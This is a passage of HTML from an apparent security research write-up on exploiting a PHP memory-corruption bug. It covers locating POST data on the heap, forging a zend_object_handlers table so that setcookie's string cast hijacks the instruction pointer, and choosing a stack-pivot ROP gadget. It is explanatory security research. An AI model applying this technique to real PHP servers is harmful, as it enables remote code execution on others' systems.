+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+(*(*(php_stream_temp_data *)(sapi_globals.request_info.request_body.abstract)).innerstream).readbuf</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="hide">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500e7669281600-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500e7669281600-1">(*(*(php_stream_temp_data *)(sapi_globals.request_info.request_body.abstract)).innerstream).readbuf</div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0000 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">Traversing this chain looks complicated, but you just need to dereference a few pointers with the correct offset and you&#8217;ll quickly find the <em>stdin://</em> stream which points to the POST data inside the heap.</p>
+<h4><span id="Preparing_the_ROP_payload">Preparing the ROP payload</span></h4>
+<p style="text-align: justify;">The second part deals with actually taking control over the PHP process and gaining code execution. For this to happen we need to discuss how one can modify the instruction pointer first.</p>
+<h5><span id="Taking_overthe_instruction_pointer">Taking over the instruction pointer</span></h5>
+<p style="text-align: justify;">We adjusted our payload to contain a fake object (instead of the previously used string zval) with a pointer to a specially crafted <em>zend_object_handlers</em> table. This table is, in its essence, an array of function pointers whose structure definition can be found in:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500ea318222711" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+"Zend/zend_object_handlers.h"
+[...]
+struct _zend_object_handlers {
+    zend_object_add_ref_t add_ref;
+[...]
+};</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500ea318222711-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ea318222711-2">2</div><div class="crayon-num" data-line="crayon-59661681500ea318222711-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ea318222711-4">4</div><div class="crayon-num" data-line="crayon-59661681500ea318222711-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ea318222711-6">6</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500ea318222711-1"><span class="crayon-s">"Zend/zend_object_handlers.h"</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ea318222711-2"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500ea318222711-3"><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">_zend_object_handlers</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ea318222711-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zend_object_add_ref_t </span><span class="crayon-v">add_ref</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500ea318222711-5"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ea318222711-6"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0001 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">When creating such a faked <em>zend_object_handlers</em> table we can simply setup <em>add_ref</em> however we prefer. The function behind this pointer usually handles the incrementation of the object&#8217;s reference counter. Once our created fake object gets passed as a parameter to &#8220;setcookie&#8221; the following things happen:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500ec553094824" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+#0  _zval_copy_ctor
+#1  0x0000000000881d01 in parse_arg_object_to_string
+[...]
+#5  0x00000000008845ca in zend_parse_parameters (num_args=2, type_spec=0xd24e46 "s|slssbb")
+#6  0x0000000000748ad5 in zif_setcookie
+[...]
+#14 0x000000000093e492 in main</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500ec553094824-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ec553094824-2">2</div><div class="crayon-num" data-line="crayon-59661681500ec553094824-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ec553094824-4">4</div><div class="crayon-num" data-line="crayon-59661681500ec553094824-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ec553094824-6">6</div><div class="crayon-num" data-line="crayon-59661681500ec553094824-7">7</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500ec553094824-1">#0&nbsp;&nbsp;_zval_copy_ctor</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ec553094824-2">#1&nbsp;&nbsp;0x0000000000881d01 in parse_arg_object_to_string</div><div class="crayon-line" id="crayon-59661681500ec553094824-3">[...]</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ec553094824-4">#5&nbsp;&nbsp;0x00000000008845ca in zend_parse_parameters (num_args=2, type_spec=0xd24e46 "s|slssbb")</div><div class="crayon-line" id="crayon-59661681500ec553094824-5">#6&nbsp;&nbsp;0x0000000000748ad5 in zif_setcookie</div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ec553094824-6">[...]</div><div class="crayon-line" id="crayon-59661681500ec553094824-7">#14 0x000000000093e492 in main</div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0000 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">Here, according to &#8220;s|sl[&#8230;]&#8221; one can see that &#8220;setcookie&#8221; is expecting a string as its first and second parameter (| marks the start of optional parameters). Hence, it will try to cast our object which is passed as the second parameter into a string. Finally, <em>_zval_copy_ctor</em> will then execute:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500ee127494813" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+"Zend/zend_variables.c"
+[...]
+ZEND_API void _zval_copy_ctor_func(zval *zvalue ZEND_FILE_LINE_DC)
+{
+[...]
+        case IS_OBJECT:
+            {
+                TSRMLS_FETCH();
+                Z_OBJ_HT_P(zvalue)-&gt;add_ref(zvalue TSRMLS_CC);
+[...]
+}</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500ee127494813-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ee127494813-2">2</div><div class="crayon-num" data-line="crayon-59661681500ee127494813-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ee127494813-4">4</div><div class="crayon-num" data-line="crayon-59661681500ee127494813-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ee127494813-6">6</div><div class="crayon-num" data-line="crayon-59661681500ee127494813-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ee127494813-8">8</div><div class="crayon-num" data-line="crayon-59661681500ee127494813-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500ee127494813-10">10</div><div class="crayon-num" data-line="crayon-59661681500ee127494813-11">11</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500ee127494813-1"><span class="crayon-s">"Zend/zend_variables.c"</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ee127494813-2"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500ee127494813-3"><span class="crayon-e">ZEND_API </span><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">_zval_copy_ctor_func</span><span class="crayon-sy">(</span><span class="crayon-e ">zval *</span><span class="crayon-e">zvalue </span><span class="crayon-v">ZEND_FILE_LINE_DC</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ee127494813-4"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-59661681500ee127494813-5"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ee127494813-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-v">IS_OBJECT</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-59661681500ee127494813-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ee127494813-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">TSRMLS_FETCH</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500ee127494813-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Z_OBJ_HT_P</span><span class="crayon-sy">(</span><span class="crayon-v">zvalue</span><span class="crayon-sy">)</span><span class="crayon-o">-&gt;</span><span class="crayon-e">add_ref</span><span class="crayon-sy">(</span><span class="crayon-e">zvalue </span><span class="crayon-v">TSRMLS_CC</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500ee127494813-10"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500ee127494813-11"><span class="crayon-sy">}</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0003 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">In particular, this will make a call to the provided <em>add_ref</em> function with the address of our object as a parameter (c.f. <a href="http://www.phpinternalsbook.com/zvals/memory_management.html#copying-zvals" target="_blank">PHP Internals Book &#8211; Copying zvals</a> to see an explanation). The corresponding assembly looks like:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500f0769873463" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+&lt;_zval_copy_ctor_func+288&gt;: mov    0x8(%rdi),%rax
+&lt;_zval_copy_ctor_func+292&gt;: callq  *(%rax)</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500f0769873463-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f0769873463-2">2</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500f0769873463-1"><span class="crayon-o">&lt;</span><span class="crayon-sy">_</span><span class="crayon-v ">zval</span><span class="crayon-sy">_</span><span class="crayon-v ">copy</span><span class="crayon-sy">_</span><span class="crayon-v ">ctor</span><span class="crayon-sy">_</span><span class="crayon-v ">func</span><span class="crayon-o">+</span><span class="crayon-cn">288</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">mov</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0x8</span><span class="crayon-sy">(</span><span class="crayon-v ">%rdi</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-v ">%rax</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f0769873463-2"><span class="crayon-o">&lt;</span><span class="crayon-sy">_</span><span class="crayon-v ">zval</span><span class="crayon-sy">_</span><span class="crayon-v ">copy</span><span class="crayon-sy">_</span><span class="crayon-v ">ctor</span><span class="crayon-sy">_</span><span class="crayon-v ">func</span><span class="crayon-o">+</span><span class="crayon-cn">292</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">callq</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-v ">%rax</span><span class="crayon-sy">)</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">Here, RDI is the first argument to the <em>_zval_copy_ctor_func</em>  function which also is the address of our fake object zval (zvalue in the source code above). As previously seen in the definition of the  <em>_zvalue_value</em> typedef, an object contains an element called <em>obj</em> of type <em>zend_object_value</em> which is defined as follows:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500f2354743466" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+"Zend/zend_types.h"
+[...]
+typedef struct _zend_object_value {
+    zend_object_handle handle;
+    const zend_object_handlers *handlers;
+} zend_object_value;</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500f2354743466-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f2354743466-2">2</div><div class="crayon-num" data-line="crayon-59661681500f2354743466-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f2354743466-4">4</div><div class="crayon-num" data-line="crayon-59661681500f2354743466-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f2354743466-6">6</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500f2354743466-1"><span class="crayon-s">"Zend/zend_types.h"</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f2354743466-2"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500f2354743466-3"><span class="crayon-r">typedef</span><span class="crayon-h"> </span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">_zend_object_value</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f2354743466-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zend_object_handle </span><span class="crayon-v">handle</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500f2354743466-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">const</span><span class="crayon-h"> </span><span class="crayon-v">zend_object_handlers</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">handlers</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f2354743466-6"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">zend_object_value</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">Thus, <em>0x8(%rdi)</em> will point to the second entry in  <em>_zend_object_value</em> which corresponds to the address of our first <em>zend_object_handlers</em> entry. As mentioned before, this entry is our custom <em>add_ref</em> function and explains why we have direct control over RAX, too.</p>
+<p style="text-align: justify;">To bypass the previously discussed non-executable memory problem we had to obtain further information. In particular, we needed to collect useful gadgets and prepare stack pivoting for our ROP chain since there wasn&#8217;t enough control over the stack yet.</p>
+<h5><span id="Leaking_ROP_gadgets">Leaking ROP gadgets</span></h5>
+<p style="text-align: justify;">Now we could setup the <em>add_ref</em> pointer, or RAX respectively, to take over the instruction pointer. Although this gives you a starting point it doesn&#8217;t ensure that all of your provided ROP gadgets are executed because the CPU will pop the next instruction&#8217;s address from the current stack once returning from the first gadget. We don&#8217;t have any control over this stack, so consequently, it was necessary to pivot the stack into our ROP chain. This is why the next step was to copy RAX into RSP and continue ropping from there. Using a locally compiled version of PHP we scanned for good candidates for stack pivoting gadgets and found that <em>php_stream_bucket_split</em> contained the following piece of code:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500f5650238627" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+&lt;php_stream_bucket_split+381&gt;: push %rax    # &lt;------------
+&lt;php_stream_bucket_split+382&gt;: sub $0x31,%al
+&lt;php_stream_bucket_split+384&gt;: rcrb $0x41,0x5d(%rbx)
+&lt;php_stream_bucket_split+388&gt;: pop %rsp     # &lt;------------
+&lt;php_stream_bucket_split+389&gt;: pop %r13
+&lt;php_stream_bucket_split+391&gt;: pop %r14
+&lt;php_stream_bucket_split+393&gt;: retq</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500f5650238627-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f5650238627-2">2</div><div class="crayon-num" data-line="crayon-59661681500f5650238627-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f5650238627-4">4</div><div class="crayon-num" data-line="crayon-59661681500f5650238627-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500f5650238627-6">6</div><div class="crayon-num" data-line="crayon-59661681500f5650238627-7">7</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500f5650238627-1"><span class="crayon-o">&lt;</span><span class="crayon-v ">php</span><span class="crayon-sy">_</span><span class="crayon-v ">stream</span><span class="crayon-sy">_</span><span class="crayon-v ">bucket</span><span class="crayon-sy">_</span><span class="crayon-v ">split</span><span class="crayon-o">+</span><span class="crayon-cn">381</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">push</span><span class="crayon-h"> </span><span class="crayon-v ">%rax</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">#</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500f5650238627-2"><span class="crayon-o">&lt;</span><span class="crayon-v ">php</span><span class="crayon-sy">_</span><span class="crayon-v ">stream</span><span class="crayon-sy">_</span><span class="crayon-v ">bucket</span><span class="crayon-sy">_</span><span class="crayon-v ">split</span><span class="crayon-o">+</span><span class="crayon-cn">382</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v ">sub</span><span class="crayon-h"> </span><span class="crayon-cn">$0x31</span><span class="crayon-sy">,</span><span class="crayon-v ">%al</span></div><div class="crayon-line" id="crayon-59661681500f5650238627-3"><span 